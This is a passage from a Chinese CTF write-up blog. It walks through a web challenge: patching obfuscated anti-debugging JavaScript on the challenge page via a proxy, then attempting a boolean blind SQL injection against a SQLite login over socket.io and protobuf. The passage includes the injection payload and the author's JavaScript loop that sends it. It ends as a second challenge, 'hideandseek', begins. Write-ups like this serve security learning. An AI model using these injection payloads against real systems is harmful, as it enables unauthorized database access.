class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;txt1&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;80&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;发送&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn_send&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;ul1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--hint:sqli me--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> _0x476866 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> _0x4bb9fc = !![];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">_0x58c9dc, _0x4b0a21</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> _0xf76523 = _0x4bb9fc ? <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (_0x4b0a21) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">const</span> _0x635e3f = _0x4b0a21[<span class="string">&#x27;apply&#x27;</span>](_0x58c9dc, <span class="built_in">arguments</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> _0x4b0a21 = <span class="literal">null</span>, _0x635e3f;</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125; : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            &#125;;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> _0x4bb9fc = ![], _0xf76523;</span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript">    &#125;();</span></span><br><span class="line"><span class="javascript">    (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        _0x476866(<span class="built_in">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> _0x22f222 = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;function\x20*\x5c(\x20*\x5c)&#x27;</span>), _0x28c056 = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)&#x27;</span>, <span class="string">&#x27;i&#x27;</span>), _0x5d5775 = _0x6c017f(<span class="string">&#x27;init&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            !_0x22f222[<span class="string">&#x27;test&#x27;</span>](_0x5d5775 + <span class="string">&#x27;chain&#x27;</span>) || !_0x28c056[<span class="string">&#x27;test&#x27;</span>](_0x5d5775 + <span class="string">&#x27;input&#x27;</span>) ? _0x5d5775(<span class="string">&#x27;0&#x27;</span>) : _0x6c017f();</span></span><br><span class="line"><span class="javascript">        &#125;)();</span></span><br><span class="line"><span class="javascript">    &#125;());</span></span><br><span class="line"><span class="javascript">    <span class="string">&#x27;use strict&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> _0x2fe348 = &#123;</span></span><br><span class="line"><span class="javascript">            <span class="string">&#x27;isOpen&#x27;</span>: ![],</span></span><br><span class="line"><span class="javascript">            <span class="string">&#x27;orientation&#x27;</span>: <span class="literal">undefined</span></span></span><br><span class="line"><span class="javascript">        &#125;, _0x14edab = <span class="number">0xa0</span>, _0x3b75b5 = <span class="function">(<span class="params">_0x231b41, _0x547b1f</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>[<span class="string">&#x27;dispatchEvent&#x27;</span>](<span class="keyword">new</span> CustomEvent(<span class="string">&#x27;devtoolschange&#x27;</span>, &#123;</span></span><br><span class="line"><span class="javascript">                <span class="string">&#x27;detail&#x27;</span>: &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="string">&#x27;isOpen&#x27;</span>: _0x231b41,</span></span><br><span class="line"><span class="javascript">                    <span class="string">&#x27;orientation&#x27;</span>: _0x547b1f</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;));</span></span><br><span class="line"><span class="javascript">        &#125;, _0x572096 = <span class="function">(<span class="params">&#123;</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="javascript">            emitEvents: emitEvents = !![]</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="javascript">        &#125; = &#123;&#125;</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> _0x112831 = <span class="built_in">window</span>[<span class="string">&#x27;outerWidth&#x27;</span>] - <span class="built_in">window</span>[<span class="string">&#x27;innerWidth&#x27;</span>] &gt; _0x14edab, _0x4ca755 = <span class="built_in">window</span>[<span class="string">&#x27;outerHeight&#x27;</span>] - <span class="built_in">window</span>[<span class="string">&#x27;innerHeight&#x27;</span>] &gt; _0x14edab, _0x80c7cf = _0x112831 ? <span class="string">&#x27;vertical&#x27;</span> : <span class="string">&#x27;horizontal&#x27;</span>;</span></span><br><span class="line"><span class="javascript">            !(_0x4ca755 &amp;&amp; _0x112831) &amp;&amp; (<span class="built_in">window</span>[<span class="string">&#x27;Firebug&#x27;</span>] &amp;&amp; <span class="built_in">window</span>[<span class="string">&#x27;Firebug&#x27;</span>][<span class="string">&#x27;chrome&#x27;</span>] &amp;&amp; <span class="built_in">window</span>[<span class="string">&#x27;Firebug&#x27;</span>][<span class="string">&#x27;chrome&#x27;</span>][<span class="string">&#x27;isInitialized&#x27;</span>] || _0x112831 || _0x4ca755) ? ((!_0x2fe348[<span class="string">&#x27;isOpen&#x27;</span>] || _0x2fe348[<span class="string">&#x27;orientation&#x27;</span>] !== _0x80c7cf) &amp;&amp; emitEvents &amp;&amp; _0x3b75b5(!![], _0x80c7cf), _0x2fe348[<span class="string">&#x27;isOpen&#x27;</span>] = !![], _0x2fe348[<span class="string">&#x27;orientation&#x27;</span>] = _0x80c7cf) : (_0x2fe348[<span class="string">&#x27;isOpen&#x27;</span>] &amp;&amp; emitEvents &amp;&amp; _0x3b75b5(![], <span class="literal">undefined</span>), _0x2fe348[<span class="string">&#x27;isOpen&#x27;</span>] = ![], _0x2fe348[<span class="string">&#x27;orientation&#x27;</span>] = <span class="literal">undefined</span>);</span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript">    _0x572096(&#123; <span class="string">&#x27;emitEvents&#x27;</span>: ![] &#125;), <span class="comment">/*setInterval(_0x572096, 0x1f4),*/</span> <span class="keyword">typeof</span> <span class="built_in">module</span> !== <span class="string">&#x27;undefined&#x27;</span> &amp;&amp; <span class="built_in">module</span>[<span class="string">&#x27;exports&#x27;</span>] ? <span class="built_in">module</span>[<span class="string">&#x27;exports&#x27;</span>] = _0x2fe348 : <span class="built_in">window</span>[<span class="string">&#x27;devtools&#x27;</span>] = _0x2fe348;</span></span><br><span class="line"><span class="javascript">&#125;());</span></span><br><span class="line"><span class="javascript"><span class="comment">// window[&#x27;devtools&#x27;][&#x27;isOpen&#x27;] === !![] &amp;&amp; (document[&#x27;documentElement&#x27;][&#x27;innerHTML&#x27;] = &#x27;Hacker!&lt;br&gt;&#x27;);</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// window[&#x27;addEventListener&#x27;](&#x27;devtoolschange&#x27;, _0x54eab0 =&gt; &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//     document[&#x27;documentElement&#x27;][&#x27;innerHTML&#x27;] = &#x27;Hacker!&lt;br&gt;&#x27;;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> sock = io[<span class="string">&#x27;connect&#x27;</span>](<span class="string">&#x27;ws://&#x27;</span> + <span class="built_in">window</span>[<span class="string">&#x27;location&#x27;</span>][<span class="string">&#x27;host&#x27;</span>] + <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> WSMessage, wsmessage, buffer;</span></span><br><span class="line"><span class="javascript">protobuf[<span class="string">&#x27;load&#x27;</span>](<span class="string">&#x27;chat.proto&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">_0x1e8bc6, _0x75e501</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (_0x1e8bc6)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">throw</span> _0x1e8bc6;</span></span><br><span class="line"><span class="javascript">    LoginReq = _0x75e501[<span class="string">&#x27;lookup&#x27;</span>](<span class="string">&#x27;wschat.chat.LoginReq&#x27;</span>), RegReq = _0x75e501[<span class="string">&#x27;lookup&#x27;</span>](<span class="string">&#x27;wschat.chat.RegReq&#x27;</span>), ServerRsp = _0x75e501[<span class="string">&#x27;lookup&#x27;</span>](<span class="string">&#x27;wschat.chat.ServerRsp&#x27;</span>), MsgReq = _0x75e501[<span class="string">&#x27;lookup&#x27;</span>](<span class="string">&#x27;wschat.chat.MsgReq&#x27;</span>), LogoutReq = _0x75e501[<span class="string">&#x27;lookup&#x27;</span>](<span class="string">&#x27;wschat.chat.LogoutReq&#x27;</span>);</span></span><br><span class="line"><span class="javascript">&#125;), <span class="built_in">window</span>[<span class="string">&#x27;onload&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> _0x1f4215 = <span class="string">&#x27;&#x27;</span>, _0x1139cf = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;btn1&#x27;</span>), _0x2af11b = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;btn2&#x27;</span>), _0x413d89 = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;btn_send&#x27;</span>), _0x29d952 = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;user&#x27;</span>), _0x22dda2 = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;pass&#x27;</span>), _0x2c48a5 = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;txt1&#x27;</span>), _0x5900fb = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;ul1&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    _0x1139cf[<span class="string">&#x27;onclick&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> _0x3689c9 = RegReq[<span class="string">&#x27;create&#x27;</span>](&#123;</span></span><br><span class="line"><span class="javascript">                <span class="string">&#x27;username&#x27;</span>: _0x29d952[<span class="string">&#x27;value&#x27;</span>],</span></span><br><span class="line"><span class="javascript">                <span class="string">&#x27;password&#x27;</span>: _0x22dda2[<span class="string">&#x27;value&#x27;</span>]</span></span><br><span class="line"><span class="javascript">            &#125;), _0x38c60d = RegReq[<span class="string">&#x27;encode&#x27;</span>](_0x3689c9)[<span class="string">&#x27;finish&#x27;</span>]();</span></span><br><span class="line"><span class="javascript">        sock[<span class="string">&#x27;emit&#x27;</span>](<span class="string">&#x27;reg&#x27;</span>, _0x38c60d[<span class="string">&#x27;slice&#x27;</span>]()[<span class="string">&#x27;buffer&#x27;</span>]);</span></span><br><span class="line"><span class="javascript">    &#125;, sock[<span class="string">&#x27;on&#x27;</span>](<span class="string">&#x27;reg_ret&#x27;</span>, <span class="function">(<span class="params">_0x77442, _0x4d8078</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        _0x77442 ? alert(_0x4d8078) : alert(_0x4d8078);</span></span><br><span class="line"><span class="javascript">    &#125;), _0x2af11b[<span class="string">&#x27;onclick&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// if (!/^\w&#123;1,16&#125;$/[&#x27;test&#x27;](_0x29d952[&#x27;value&#x27;])) &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     alert(&#x27;用户名不符合规范&#x27;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     return;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// if (!/^\w&#123;1,16&#125;$/[&#x27;test&#x27;](_0x22dda2[&#x27;value&#x27;])) &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     alert(&#x27;密码不符合规范&#x27;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     return;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> _0xea8ad4 = LoginReq[<span class="string">&#x27;create&#x27;</span>](&#123;</span></span><br><span class="line"><span class="javascript">                <span class="string">&#x27;username&#x27;</span>: _0x29d952[<span class="string">&#x27;value&#x27;</span>],</span></span><br><span class="line"><span class="javascript">                <span class="string">&#x27;password&#x27;</span>: _0x22dda2[<span class="string">&#x27;value&#x27;</span>]</span></span><br><span class="line"><span class="javascript">            &#125;), _0x581e63 = LoginReq[<span class="string">&#x27;encode&#x27;</span>](_0xea8ad4)[<span class="string">&#x27;finish&#x27;</span>]();</span></span><br><span class="line"><span class="javascript">        sock[<span class="string">&#x27;emit&#x27;</span>](<span class="string">&#x27;login&#x27;</span>, _0x581e63[<span class="string">&#x27;slice&#x27;</span>]()[<span class="string">&#x27;buffer&#x27;</span>]);</span></span><br><span class="line"><span class="javascript">    &#125;, sock[<span class="string">&#x27;on&#x27;</span>](<span class="string">&#x27;login_ret&#x27;</span>, <span class="function">(<span class="params">_0x253784, _0x4ca143</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        _0x253784 ? alert(_0x4ca143) : (_0x1f4215 = _0x29d952[<span class="string">&#x27;value&#x27;</span>], alert(_0x4ca143));alert(_0x4ca143.indexOf(<span class="string">&quot;成功&quot;</span>) != -<span class="number">1</span>);</span></span><br><span class="line"><span class="javascript">    &#125;), _0x413d89[<span class="string">&#x27;onclick&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> _0x254c70 = MsgReq[<span class="string">&#x27;create&#x27;</span>](&#123; <span class="string">&#x27;msg&#x27;</span>: _0x2c48a5[<span class="string">&#x27;value&#x27;</span>] &#125;), _0x56ebdb = MsgReq[<span class="string">&#x27;encode&#x27;</span>](_0x254c70)[<span class="string">&#x27;finish&#x27;</span>]();</span></span><br><span class="line"><span class="javascript">        sock[<span class="string">&#x27;emit&#x27;</span>](<span class="string">&#x27;msg&#x27;</span>, _0x56ebdb[<span class="string">&#x27;slice&#x27;</span>]()[<span class="string">&#x27;buffer&#x27;</span>]);</span></span><br><span class="line"><span class="javascript">    &#125;, sock[<span class="string">&#x27;on&#x27;</span>](<span class="string">&#x27;msg&#x27;</span>, <span class="function">(<span class="params">_0x2378cb, _0x4ce8f4</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> _0x3ca130 = <span class="built_in">document</span>[<span class="string">&#x27;createElement&#x27;</span>](<span class="string">&#x27;li&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        _0x3ca130[<span class="string">&#x27;innerHTML&#x27;</span>] = <span class="string">&#x27;&lt;h3&gt;&#x27;</span> + _0x2378cb + <span class="string">&#x27;&lt;/h3&gt;&lt;p&gt;&#x27;</span> + _0x4ce8f4 + <span class="string">&#x27;&lt;/p&gt;&#x27;</span>, _0x5900fb[<span class="string">&#x27;appendChild&#x27;</span>](_0x3ca130);</span></span><br><span class="line"><span class="javascript">    &#125;), sock[<span class="string">&#x27;on&#x27;</span>](<span class="string">&#x27;msg_ret&#x27;</span>, <span class="function">(<span class="params">_0x491ba1, _0x25dec1</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (_0x491ba1)</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&#x27;发送失败：&#x27;</span> + _0x25dec1);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> _0x4a7033 = <span class="built_in">document</span>[<span class="string">&#x27;createElement&#x27;</span>](<span class="string">&#x27;li&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            _0x4a7033[<span class="string">&#x27;className&#x27;</span>] = <span class="string">&#x27;mine&#x27;</span>, _0x4a7033[<span class="string">&#x27;innerHTML&#x27;</span>] = <span class="string">&#x27;&lt;h3&gt;&#x27;</span> + _0x1f4215 + <span class="string">&#x27;&lt;/h3&gt;&lt;p&gt;&#x27;</span> + _0x2c48a5[<span class="string">&#x27;value&#x27;</span>] + <span class="string">&#x27;&lt;/p&gt;&#x27;</span>, _0x5900fb[<span class="string">&#x27;appendChild&#x27;</span>](_0x4a7033), _0x2c48a5[<span class="string">&#x27;value&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript">&#125;, <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    _0x6c017f();</span></span><br><span class="line"><span class="javascript">&#125;, <span class="number">0xfa0</span>);</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">_0x6c017f</span>(<span class="params">_0x19de66</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">_0x2ed5ce</span>(<span class="params">_0x255d4e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// if (typeof _0x255d4e === &#x27;string&#x27;)</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     return function (_0x11534e) &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     &#125;[&#x27;constructor&#x27;](&#x27;while\x20(true)\x20&#123;&#125;&#x27;)[&#x27;apply&#x27;](&#x27;counter&#x27;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// else</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     (&#x27;&#x27; + _0x255d4e / _0x255d4e)[&#x27;length&#x27;] !== 0x1 || _0x255d4e % 0x14 === 0x0 ? function () &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//         return !![];</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     &#125;[&#x27;constructor&#x27;](&#x27;debu&#x27; + &#x27;gger&#x27;)[&#x27;call&#x27;](&#x27;action&#x27;) : function () &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//         return ![];</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     &#125;[&#x27;constructor&#x27;](&#x27;debu&#x27; + &#x27;gger&#x27;)[&#x27;apply&#x27;](&#x27;stateObject&#x27;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// _0x2ed5ce(++_0x255d4e);</span></span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (_0x19de66)</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> _0x2ed5ce;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">else</span></span></span><br><span class="line"><span class="javascript">            _0x2ed5ce(<span class="number">0x0</span>);</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">catch</span> (_0xf40179) &#123;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>对于前两个部分，毕竟都是在前端的操作，我们自然是可以操作的了，上面的代码已经是我经过patch后的了，我们采用一个代理工具<code>charles</code> 把根目录的html的js部分替换为上述部分：</p>
<p><img src="/2021/12/09/%E6%9A%97%E6%B3%89%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%A1%A5%E9%A2%98wp/assets/image-20211209110846004.png" alt="image-20211209110846004"></p>
<p>(在Map to local path部分修改为本地文件，这样在经过代理，到我们浏览器的环境都是我经过patch的js了。)</p>
<p>elegant-crazy师傅采用的是burp在代理设置的时候把alert()return那些部分替换为空了，能绕过对username的检测，但是绕不过反调试。</p>
<p>然后就到了第三部分，提示里说了sqli me,显然是一个sql注入了，hint里说了是用sqlite的数据库，</p>
<p>上网查了一下所有sqlite的注入技巧：学习资料：<a href="https://xz.aliyun.com/t/10308#toc-10">https://xz.aliyun.com/t/10308#toc-10</a></p>
<p><img src="/2021/12/09/%E6%9A%97%E6%B3%89%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%A1%A5%E9%A2%98wp/assets/image-20211209111251765.png" alt="image-20211209111251765"></p>
<p>注入点太明显了，没有任何过滤，但是回显只有两种，只能采用盲注的办法。盲注的脚本在上述文章里也有现成的，出这题胜利在望，结果这才是折磨的开始。</p>
<p>elegant-crazy师傅是用python调了protobuf库，实现的盲注，所有的sock事件全要自己手写一遍，很是累， 我寻思着在js里人家都写好了，我直接在js部分添加了盲注的部分就好了：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sock[<span class="string">&#x27;on&#x27;</span>](<span class="string">&#x27;login_ret&#x27;</span>, <span class="function">(<span class="params">_0x253784, _0x4ca143</span>) =&gt;</span> &#123;</span><br><span class="line">        _0x253784 ? (</span><br><span class="line">            <span class="built_in">console</span>.log(_0x4ca143),</span><br><span class="line">            returned = (_0x4ca143.indexOf(<span class="string">&quot;成功&quot;</span>) != -<span class="number">1</span>),</span><br><span class="line">            locked = <span class="literal">true</span>) : (</span><br><span class="line">            _0x1f4215 = _0x29d952[<span class="string">&#x27;value&#x27;</span>], <span class="comment">/*alert(_0x4ca143),*/</span></span><br><span class="line">            returned = (_0x4ca143.indexOf(<span class="string">&quot;成功&quot;</span>) != -<span class="number">1</span>),</span><br><span class="line">            locked = <span class="literal">true</span>, </span><br><span class="line">            <span class="built_in">console</span>.log(_0x4ca143));</span><br><span class="line">    &#125;); </span><br><span class="line">    <span class="keyword">var</span> ans = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">     flag = <span class="literal">false</span>;</span><br><span class="line">     <span class="keyword">let</span> low = <span class="number">32</span>;</span><br><span class="line">     <span class="keyword">let</span> high = <span class="number">128</span>;</span><br><span class="line">     <span class="keyword">let</span> mid = (low+high )/ <span class="number">2</span></span><br><span class="line">     <span class="keyword">let</span> midchar = <span class="built_in">String</span>.fromCharCode(mid);</span><br><span class="line">     <span class="keyword">while</span>(low&lt;high)&#123;</span><br><span class="line">        <span class="keyword">let</span> payload = <span class="string">&quot;admin&#x27; and substr((select hex(group_concat(sql)) from sqlite_master),&quot;</span> + i + <span class="string">&quot;,1)&gt;&#x27;&quot;</span> + midchar + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> buffer = LoginReq[<span class="string">&#x27;create&#x27;</span>](&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span> : payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : <span class="string">&quot;123&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(payload);</span><br><span class="line">        <span class="keyword">var</span> _0x581e63 = LoginReq[<span class="string">&#x27;encode&#x27;</span>](buffer)[<span class="string">&#x27;finish&#x27;</span>]();</span><br><span class="line">        <span class="comment">// locked = false;</span></span><br><span class="line">        sock[<span class="string">&#x27;emit&#x27;</span>](<span class="string">&#x27;login&#x27;</span>, _0x581e63[<span class="string">&#x27;slice&#x27;</span>]()[<span class="string">&#x27;buffer&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; <span class="number">1000000000</span>; j++)&#123;&#125;</span><br><span class="line">        <span class="comment">// while(locked == false)&#123;&#125;</span></span><br><span class="line">        locked = <span class="literal">false</span>; </span><br><span class="line">        <span class="built_in">console</span>.log(returned);</span><br><span class="line">        <span class="keyword">if</span> (returned === <span class="literal">false</span>)&#123;</span><br><span class="line">          low = mid + <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">          high = mid;</span><br><span class="line">       &#125;</span><br><span class="line">        mid = <span class="built_in">Math</span>.floor((low+high) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(mid === <span class="number">32</span> || mid === <span class="number">127</span>)&#123;flag = <span class="literal">true</span>; <span class="keyword">break</span>;&#125;</span><br><span class="line">        midchar = <span class="built_in">String</span>.fromCharCode(mid);</span><br><span class="line">        <span class="built_in">console</span>.log(mid);</span><br><span class="line">     &#125;</span><br><span class="line">     ans = ans + midchar; </span><br><span class="line">     <span class="built_in">console</span>.log(ans);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(ans);</span><br></pre></td></tr></table></figure>
<p>但是结果不尽人意，所有的返回都是true，我的布尔盲注的结果需要依托<code>sock.io(login_ret)</code>这个事件触发后的回调函数的执行，可是因为这个事件执行并不是我们想象的那种串行的，所以导致顺序错乱，无法进行布尔盲注。</p>
<p>解决措施有,就是加锁，设了一个全局变量，当且仅当回调函数执行时解锁，平时状态是死循环状态。elegant-crazy师傅就是采用的这种办法，能成功顺序返回，但是我加了锁之后就变成浏览器堵塞了，完全轮不到回调函数执行。</p>
<p>思考了很久问题所在，也尝试用async和await的方法去强制等待事情的返回，强行延时1秒钟，但都失败了。</p>
<p>第二天早上起来搜到了这两篇文章：<a href="https://www.coder.work/article/5073843，https://stackoverflow.com/questions/51372997/socket-io-how-to-send-multiple-messages-sequentially">https://www.coder.work/article/5073843，https://stackoverflow.com/questions/51372997/socket-io-how-to-send-multiple-messages-sequentially</a></p>
<p>大概意思就是node实现这块还用了一个缓冲区，等挤在到一定数量的时候才会发送，js盲注失败了。</p>
<p>本题还可以用selenium模拟我的操作（但是我不会怎么挂代理替换js），毕竟有我思考上面问题的那段时间，我觉得我手工盲注也差不多该出了。</p>
<p>一言以蔽之，还是用python实现protobuf的事件交互是最简单的。</p>
<p>最后附上有关<code>sock.io</code>和<code>protobuf</code>的一些资料吧。</p>
<blockquote>
<p><a href="https://socket.gitbook.io/docs/">https://socket.gitbook.io/docs/</a></p>
<p><a href="http://www.febeacon.com/protobuf_docs_zh_cn/routes/installation.html">http://www.febeacon.com/protobuf_docs_zh_cn/routes/installation.html</a></p>
</blockquote>
<h2 id="hideandseek"><a href="#hideandseek" class="headerlink" title="hideandseek"></a>hideandseek</h2><p>和web没有啥关系，和二进制全是关系。</p>
<p>先附上打本地的DockerFile:</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">8.1</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> ./src /var/www/html</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> ./flag /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /var/www/html/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod -R  0555  /var/www/html/</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;-S&quot;</span>, <span class="string">&quot;0.0.0.0:8000&quot;</span>, <span class="string">&quot;-t&quot;</span>, <span class="string">&quot;/var/www/html&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p>这题上先读flag，然后把flag给覆盖了，你只有一次执行任意代码的机会。</p>
<p>思路上来一下子就指向了<code>/proc</code>，进程目录，我们肯定是能通过分析这个进程把flag拿到了。目前已知的<code>/proc</code>的博客有：</p>
<blockquote>
